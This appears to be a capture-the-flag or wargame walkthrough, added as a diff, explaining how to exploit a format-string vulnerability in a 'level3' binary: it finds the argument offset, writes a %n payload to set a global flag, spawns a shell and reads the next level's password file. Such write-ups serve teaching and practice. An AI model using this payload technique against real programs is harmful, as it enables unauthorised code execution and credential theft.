@@ -1,0 +1,19 @@
+Goal: use the format-string vulnerability to set the global flag to 0x40 and spawn a shell.
+
+Observation:
+- `printf(buf)` treats user input as a format string.
+- A global at 0x804988c is compared to 0x40; if equal, it calls `system("/bin/sh")`.
+
+Steps:
+1) Find where our input appears in the format arguments:
+	Input: AAAA %p %p %p %p ...
+	Output shows 0x41414141 at position 4 -> offset 4.
+2) Write 0x40 using `%n`:
+	Place the target address first, then print 60 chars (4 already counted), then `%4$n`.
+3) Execute (keep stdin open for the shell):
+	(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
+4) In the spawned shell:
+	cat /home/user/level4/.pass
+
+Result:
+- The command prints the level4 password, stored in the flag file.
